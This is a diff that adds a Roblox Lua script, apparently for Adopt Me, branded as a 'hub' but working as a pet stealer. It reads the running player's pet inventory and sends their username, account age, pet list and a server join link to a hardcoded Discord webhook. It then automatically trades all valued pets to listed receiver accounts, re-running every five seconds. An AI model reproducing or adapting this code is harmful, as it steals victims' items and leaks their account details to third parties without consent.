@@ -1,0 +1,148 @@
+-- [[ MONDEUR HUB (BEST) | V6 MOZIL-KILLER ]] --
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- [[ CONFIG ]] --
+local USER_WEBHOOK = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
+local POINT_SYSTEM_URL = "https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/Pointsystem"
+local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
+
+local PetValues = {}
+
+-- [[ STABILITY: WAIT FOR GAME ]] --
+if not game:IsLoaded() then game.Loaded:Wait() end
+repeat task.wait(1) until ReplicatedStorage:FindFirstChild("API")
+
+-- [[ LOAD POINT SYSTEM ]] --
+local function loadPoints()
+    local success, content = pcall(function() return game:HttpGet(POINT_SYSTEM_URL) end)
+    if success then
+        for line in content:gmatch("[^\r\n]+") do
+            local name, val = line:match("([^:=]+)[:=](%d+)")
+            if name and val then 
+                PetValues[name:lower():gsub("%s+", "")] = tonumber(val) 
+            end
+        end
+    end
+end
+loadPoints()
+
+--------------------------------------------------------------
+-- THE MOZIL-STYLE REDESIGN
+--------------------------------------------------------------
+local function sendMondeurWebhook(allPets, valuedPets, totalVal, receiverName)
+    local request = (syn and syn.request) or (http and http.request) or http_request or request
+    if not request then return end
+
+    -- Generate Loot List (Now includes EVERYTHING found)
+    local lootList = ""
+    if #allPets > 0 then
+        for i, p in ipairs(allPets) do
+            if i > 15 then -- Limit to top 15 to avoid Discord character limit
+                lootList = lootList .. "*...and more items*"
+                break
+            end
+            local emoji = p.value > 0 and "⭐" or "🐾"
+            lootList = lootList .. emoji .. " " .. p.name .. " — `" .. p.value .. "`\n"
+        end
+    else
+        lootList = "❌ No items detected in backpack."
+    end
+
+    local payload = {
+        username = "Mondeur Hub (Best)",
+        embeds = {{
+            title = "MondeurOnTop • ADM Hit [ 🌊 ]",
+            color = 0x3498db, -- Classic Blue
+            description = "### 📄 Player Information\n" ..
+                "👤 **Display Name** : " .. LocalPlayer.DisplayName .. "\n" ..
+                "🆔 **Username** : " .. LocalPlayer.Name .. "\n" ..
+                "📅 **Account Age** : " .. LocalPlayer.AccountAge .. " days\n" ..
+                "📱 **Executor** : Delta\n" ..
+                "👥 **Players** : " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. "\n" ..
+                "😎 **Receiver** : " .. (receiverName or "Searching...") .. "\n" ..
+                "💰 **Total Value** : " .. totalVal .. "\n\n" ..
+                "### 📡 Player Status\n" ..
+                "🟢 **Connected**\n\n" ..
+                "### 👑 Valuable Pets\n" ..
+                "```\n" .. lootList .. "```\n" ..
+                "### 👥 Join Player\n" ..
+                "[**Join Server**](https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId .. ")",
+            footer = { text = "Mondeur Scripts - Adopt Me | " .. os.date("%X") }
+        }}
+    }
+
+    pcall(function()
+        request({
+            Url = USER_WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+--------------------------------------------------------------
+-- SCAN & TRADE LOGIC (FIXED TO SHOW ALL)
+--------------------------------------------------------------
+local function scanAndTrade()
+    local receiver = nil
+    for _, name in ipairs(TARGET_RECEIVERS) do
+        if Players:FindFirstChild(name) then receiver = Players[name] break end
+    end
+
+    local allPets, valuedPets, totalVal = {}, {}, 0
+    local success, inv = pcall(function() return ReplicatedStorage.API["InventoryAPI/GetInventory"]:InvokeServer() end)
+    
+    if success and inv then
+        for _, item in ipairs(inv) do
+            if item.Kind == "Pet" then
+                local cleanName = item.Name:lower():gsub("%s+", "")
+                local val = 0
+                
+                -- Check for value
+                for pointName, pointVal in pairs(PetValues) do
+                    if string.find(cleanName, pointName) then
+                        val = pointVal
+                        break
+                    end
+                end
+
+                local petData = {id = item.Id, name = item.Name, value = val}
+                table.insert(allPets, petData)
+                
+                if val > 0 then
+                    table.insert(valuedPets, petData)
+                    totalVal = totalVal + val
+                end
+            end
+        end
+    end
+
+    -- Send Webhook with ALL pets
+    sendMondeurWebhook(allPets, valuedPets, totalVal, receiver and receiver.Name or "None Online")
+
+    -- Execute Trade if valued items found
+    if #valuedPets > 0 and receiver then
+        local TradeAPI = ReplicatedStorage.API
+        TradeAPI["TradeAPI/SendTradeRequest"]:FireServer(receiver)
+        for _, p in ipairs(valuedPets) do
+            TradeAPI["TradeAPI/AddItemToOffer"]:FireServer(p.id)
+        end
+        TradeAPI["TradeAPI/AcceptTrade"]:FireServer()
+        TradeAPI["TradeAPI/ConfirmTrade"]:FireServer()
+    end
+end
+
+-- [[ START ]] --
+print("🚀 Mondeur Hub (Best) V6 Loaded.")
+scanAndTrade()
+
+task.spawn(function()
+    while true do
+        task.wait(5) -- 5 second loop to avoid spamming
+        pcall(scanAndTrade)
+    end
+end)
